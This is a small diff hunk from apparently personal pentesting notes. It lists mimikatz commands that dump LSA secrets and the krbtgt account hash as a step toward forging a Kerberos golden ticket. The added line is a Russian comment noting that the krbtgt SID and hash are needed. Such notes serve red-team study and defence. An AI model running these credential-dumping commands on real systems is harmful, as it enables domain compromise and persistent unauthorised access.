@@ -64,7 +64,7 @@ mimikatz # privilege::debug
 
 mimikatz # token::elevate (DONT NEED THIS)
 
-mimikatz # lsadump::lsa /patch (lsadump::lsa /inject /name:krbtgt)
+mimikatz # lsadump::lsa /patch (lsadump::lsa /inject /name:krbtgt) ---нужен sid и хеш krbtgt
 
 # Create golden ticket (write to file in this case)
 PS C:\Tools> .\mimikatz.exe
